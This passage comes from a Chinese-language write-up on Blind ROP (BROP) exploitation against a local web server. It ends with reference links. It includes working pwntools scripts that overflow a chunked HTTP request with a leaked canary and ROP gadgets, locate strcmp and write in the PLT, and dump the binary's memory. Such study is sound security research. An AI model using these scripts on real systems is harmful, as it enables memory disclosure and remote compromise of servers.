            log.info("3 strcmp(erroraddr1,trueaddr) out 0x%x", strcmp_plt)
            continue
        if check_strcmp(canary_offset, canary, buf_size, stop_gadget, depth,useful_gadget,strcmp_plt,trueaddr,trueaddr)==0:
            log.info("4 strcmp(trueaddr,trueaddr) out 0x%x", strcmp_plt)
            continue
        if check_strcmp(canary_offset, canary, buf_size, stop_gadget, depth,useful_gadget,strcmp_plt,vsyscall+0x1000-1,trueaddr)==0:
            log.info("5 strcmp(vsyscall+0x1000-1,trueaddr) out 0x%x", strcmp_plt)
            continue
        log.info("find strcmp_plt 0x%x:",strcmp_plt)
        return strcmp_plt
def check_strcmp(canary_offset, canary, buf_size, stop_gadget, depth,useful_gadget,strcmp_plt,addr1,addr2):
    s = connect("127.0.0.1", 80)
    s.send(base_payload + "A" * canary_offset + canary + 'A' * buf_size + p64(useful_gadget+7) + p64(addr1) + p64(addr1) +p64(useful_gadget+9)+ p64(addr2) + p64(strcmp_plt) +p64(stop_gadget) * (depth-6))
    try:
        checkstr = s.recv(timeout=0.5)
        s.close()
        return 1
    except:
        s.close()
        return 0

if __name__ == "__main__":
    canary_offset = 5066
    canary = "\x00\x2d\x8a\x57\xe7\x59\xcc\x69"
    buf_size = 24
    stop_gadget = 0x402580
    depth = 44
    useful_gadget = 0x430c5f
    strcmp_plt = get_strcmp_plt(canary_offset, canary, buf_size, stop_gadget, depth,useful_gadget)
```

![image-20220808150832872](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220808150832872.png)

![image-20220808150849243](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220808150849243.png)

#### 寻找write

我们现在能够控制rdi,rsi,rdx了，就可以控制write函数的传参，利用write函数dump内存。现在来寻找write函数。write函数可以将buf中的n个字节写入指定文件描述符中

找到strcmp后就可以尽情设置rdx了，这时候就可以去寻找使用3个参数的write函数，以便后续dump程序内存。write函数可以将buf中的n个字节写入指定文件描述符中，`Linux ELF`文件最开始的几个字节是 `Linux` 的模数

![image-20220808151505468](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220808151505468.png)

我们从0x400000开始取字符串，将会取到"\x7f\x45\x4c\x46\x02\x01\x01" == "\x7fELF\x02\x01\x01" 这7个字节的字符串

```
ssize_t write(int handle, void *buf, int nbyte)
handle 是 文件描述符；         				 edi
buf是指定的缓冲区，即 指针，指向一段内存单元；		esi
nbyte是要写入文件指定的字节数；					 edx
返回值：写入文档的字节数（成功）；-1（出错）
```

我在控制edx的时候发现，rsi的地址影响edx的值，我们控制edx是控制写入的长度，所以我就使用地址0x400020(PHT file offset)，让edx为0x40

```python
# -*- coding:utf-8 -*-
# from __future__ import print_function
import socket
from pwn import *

#context.log_level = "DEBUG"

base_payload = """
GET / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked\r\n\r\n"""

def get_write_plt(canary_offset, canary, buf_size, stop_gadget, depth, useful_gadget, strcmp_plt, start_addr=0x400000):
    write_plt = start_addr
    while 1:
        write_plt = write_plt + 0x10
        for i in range(1,50):
            s = connect("127.0.0.1", 80)
            s.send(
                base_payload + "A" * canary_offset + canary + 'A' * buf_size + p64(useful_gadget + 7) + p64(0x400020) + p64(
                    0) + p64(useful_gadget + 9) + p64(0x400000) + p64(strcmp_plt) + p64(useful_gadget + 7) + p64(0x400000) + p64(
                    0x400000) + p64(useful_gadget + 9) + p64(i) + p64(write_plt) + p64(stop_gadget) * (depth - 13))
            try:
                checkstr = s.recv(timeout=0.5)
                s.close()
                if "ELF" in checkstr:
                    log.info("find write_plt,0x%x",write_plt)
                    return write_plt
                log.info("not write_plt:0x%x  fd:0x%x", write_plt, i)
            except:
                s.close()
                log.info("not write_plt:0x%x  fd:0x%x", write_plt,i)
                
if __name__ == "__main__":
    canary_offset = 5066
    canary = "\x00\x81\xdf\x79\x04\x9d\x8b\x37"
    buf_size = 24
    stop_gadget = 0x402580
    depth = 44
    useful_gadget = 0x430c5f
    strcmp_plt = 0x402920
    write_plt = get_write_plt(canary_offset, canary, buf_size, stop_gadget, depth, useful_gadget, strcmp_plt)
```

![image-20220808164459943](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220808164459943.png)

![image-20220808164812773](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220808164812773.png)

#### Dump内存

```python
from pwn import *

#context.log_level = "DEBUG"

base_payload = """
GET / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked\r\n\r\n"""

def dump_addr(canary_offset, canary, buf_size, stop_gadget, depth, useful_gadget, strcmp_plt,write_plt,start_addr=0x400000):
    result = ""
    while start_addr<0x405000:
        s = connect("127.0.0.1", 80)
        s.send(
            base_payload + "A" * canary_offset + canary + 'A' * buf_size + p64(useful_gadget + 7) + p64(0x400020) + p64(
                0) + p64(useful_gadget + 9) + p64(0x400000) + p64(strcmp_plt) + p64(useful_gadget + 7) + p64(start_addr) + p64(
                start_addr) + p64(useful_gadget + 9) + p64(3) + p64(write_plt) + p64(stop_gadget) * (depth - 13))
        checkstr = s.recv(timeout=0.5)
        s.close()
        result+=checkstr
        log.info("addr:0x%x",start_addr)
        start_addr += 0x40
    return result
if __name__ == "__main__":
    canary_offset = 5066
    canary = "\x00\x81\xdf\x79\x04\x9d\x8b\x37"
    buf_size = 24
    stop_gadget = 0x402580
    depth = 44
    useful_gadget = 0x430c5f
    strcmp_plt = 0x402920
    write_plt = 0x402ab0
    dumpdata = dump_addr(canary_offset, canary, buf_size, stop_gadget, depth, useful_gadget, strcmp_plt,write_plt)
    with open("dumpdata", "wb") as f:
        for x in dumpdata:
            f.write(x)
```

能够得到GOT表中write的位置，以及其他函数的在plt位置等等，像execve的plt就为402810

![image-20220808181215851](BROP%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6.assets/image-20220808181215851.png)





参考文章：

BROP技术研究：https://mp.weixin.qq.com/s/Old4dKS2aDp1TETTn0WzoQ

BROP 攻击技术 ｜ PWN ：https://cloud.tencent.com/developer/article/1965871

BROP攻击原理：		 		

https://wooyun.js.org/drops/Blind%20Return%20Oriented%20Programming%20(BROP)%20Attack%20-%20%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86.html

srop、brop和ret2_csu_init技术分析：

 https://de4dcr0w.github.io/srop-brop%E5%92%8Cret2_csu_init%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html

ELF文件结构解析  https://pan.baidu.com/s/1TvDW1BV0LlYWClIJDkdGDA 提取码: kkas 

vsyscalls 介绍 https://xinqiu.gitbooks.io/linux-insides-cn/content/SysCall/linux-syscall-3.html